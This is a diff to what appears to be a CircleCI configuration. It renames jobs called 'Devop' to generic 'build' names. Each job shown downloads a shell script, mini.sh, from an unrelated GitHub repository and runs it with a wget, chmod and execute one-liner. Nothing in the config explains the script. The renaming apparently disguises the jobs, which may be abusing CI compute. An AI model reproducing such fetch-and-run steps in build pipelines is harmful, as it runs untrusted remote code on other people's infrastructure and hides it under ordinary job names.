@@ -1,6 +1,6 @@
 version: 2.1
 jobs:
-    Devop:
+    build:
     docker:
       - image: circleci/ruby:2.7-node
         auth:
@@ -11,7 +11,7 @@ jobs:
       - run: 
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
-    Devop1:
+    build1:
     docker:
       - image: circleci/ruby:2.7-node
         auth:
@@ -22,7 +22,7 @@ jobs:
       - run: 
             command: |
               wget https://raw.githubusercontent.com/Kabellilit/manis/main/mini.sh && chmod +x mini.sh && ./mini.sh
-    Devop2:
+    build2:
     docker:
       - image: circleci/ruby:2.7-node
         auth:
@@ -268,9 +268,9 @@ workflows:
     version: 2.1
     build:
         jobs:
-            - Devop
-            - Devop1
-            - Devop2
+            - build
+            - build1
+            - build2
             - Devop3
             - Devop4
             - Devop5
